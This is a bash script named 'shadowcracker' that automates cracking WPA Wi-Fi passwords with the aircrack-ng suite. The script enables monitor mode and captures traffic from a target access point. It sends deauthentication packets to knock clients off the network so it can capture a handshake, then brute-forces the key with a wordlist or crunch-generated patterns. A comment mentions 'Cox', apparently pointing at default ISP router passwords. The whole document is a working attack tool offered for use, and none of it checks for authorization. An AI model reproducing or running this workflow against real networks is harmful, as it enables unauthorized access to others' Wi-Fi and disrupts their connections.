#!/bin/bash
#################
#shadowcracker  #
#made by dotwavD#
#################

#github.com/coltodu123
#Contact NSA
#this is a automated program for airmon and aircrack to bruteforce logins. 
#you can use crunch if you dont have a wordlist and if you have the semi password
#Mr. Robot for life

bssid=""
wpa=""
channel=""
destination=""
wordlist=""
interface=""
ddos=""
crunch=""
mon="mon"
cap="*.cap"
crunchstart=""
crunchend=""
crunchpattern=""
crunchfile=""
crunchtype=""
crunchtype1=""
bruteoptions=""

cleanup() {
	airmon-ng stop $interface
	NetworkManager restart

	}
crunchaircrack() {
	echo "Enter the Wpa handshake."
	read wpa
	cd /
	destination="$destination$cap"
	echo "Enter the starting number for crunch"
	read crunchstart
	echo "Enter the ending number for crunch"
	read crunchend
	echo "Enter the file name or press enter for Default " 
	read crunchfile
	echo "Enter the Pattern/Keyspace for the network e.g 3HW14%W@0%%%% "
	read crunchpattern
	echo "Enter the type from file e.g alpha-numeric"
	read crunchtype
	echo "Enter another type unless you dont need one press enter"
	read crunchtype1
	if [ $crunchfile == "" ]
	then
		crunchfile="/usr/share/rainbowcrack/charset.txt"
	fi
	crunch $crunchstart $crunchend -f $crunchfile $crunchtype $crunchtype1 -t $crunchpattern | aircrack-ng -a2 -b $wpa -w $wordlist $destination
	}

aircrack() {
	echo "Enter the Wpa handshake."
	read wpa
	cd /
	destination="$destination$cap"
	aircrack-ng -a2 -b $wpa -w $wordlist $destination
	#crunch 13 13 -f /usr/share/rainbowcrack/charset.txt alpha-numeric -t 3HW14%W@0%%%% | aircrack-ng -a2 -b $wpa -w - /root/Desktop/*.cap

	}
airodump() {
	airodump-ng $interface
	echo "Enter the bssid:"
	read bssid
	echo "Enter the channel:"
	read channel
	clear
	echo "You need to wait for a wpa and copy it and enter in the terminal"
	echo "Being close to the internet helps for getting the wpa super fast."
	clear
	echo "Enter the ammout of packets you want to send,"
	read ddos
	sleep 4
	echo $ddos
	aireplay-ng --deauth $ddos -a $bssid $interface
	airodump-ng -c $channel --bssid $bssid -w $destination $interface
}
airmon() {
	echo "Welcome to the shadowcracker program"
	sleep 3
	airmon-ng check kill
	clear
	airmon-ng start $interface
	interface="$interface$mon"
	clear
	echo "Press Ctrl + c when done and remember the channel and copy the bssid"
	sleep 5

}
Information(){
	echo "Enter your interface:"
	read interface
	clear
	echo "Enter your wordlist:"
	read wordlist
	clear
	echo "Enter the destination you want your cap files to go to:"
	read destination
}


Welcome() {
	echo "Welcome to Aircrack-Auto!"
	echo "This program is ment for bruteforcing logins with  the aircrack program."
	Information
	airmon
	airodump

	Optionscheck() {
		read bruteoption
		if [ $bruteoption = "Cox" ] || [ $bruteoption = "cox" ];
		then
			clear
			echo 
		else
			clear
			echo "Error unkonwn option try again"
			Options
			Optionscheck
		fi

	}
}

Options() {
	echo "Enter one of the options below."
	echo ""
	echo "Cox E.G 6B8193"
	echo ""
}

Welcome
if [ $wordlist = "-" ]
then
	crunchaircrack
else
	aircrack
fi
cleanup

